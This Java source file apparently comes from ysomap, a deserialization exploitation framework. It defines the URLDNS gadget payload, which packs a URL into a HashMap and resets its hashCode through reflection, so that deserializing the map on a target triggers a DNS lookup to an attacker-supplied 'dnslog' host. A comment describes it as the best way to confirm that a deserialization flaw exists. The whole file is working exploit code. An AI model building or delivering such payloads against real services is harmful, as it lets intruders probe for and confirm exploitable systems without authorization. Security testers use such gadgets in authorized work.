package ysomap.core.payload.java.jdk;

import ysomap.common.annotation.Authors;
import ysomap.common.annotation.Dependencies;
import ysomap.common.annotation.Payloads;
import ysomap.common.annotation.Require;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.URLBullet;
import ysomap.core.util.ReflectionHelper;

import java.net.URL;
import java.util.HashMap;

/**
 * URLDNS 最好的确认是否存在反序列化漏洞的gadget
 * 不依赖jdk版本，使用了原生的Map，check是否相同时触发URL
 * @author wh1t3P1g
 * @since 2020/2/23
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Payloads
@Authors({ Authors.GEBL })
@Dependencies({"*"})
@Require(bullets = {"URLBullet"}, param = false)
public class URLDNS extends Payload<Object> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof URL;
    }

    @Override
    public Bullet getDefaultBullet(String command) throws Exception {
        return new URLBullet().set("dnslog",command);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        ht.put(obj, obj.toString()); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.

        ReflectionHelper.setFieldValue(obj, "hashCode", -1);
        return ht;
    }
}
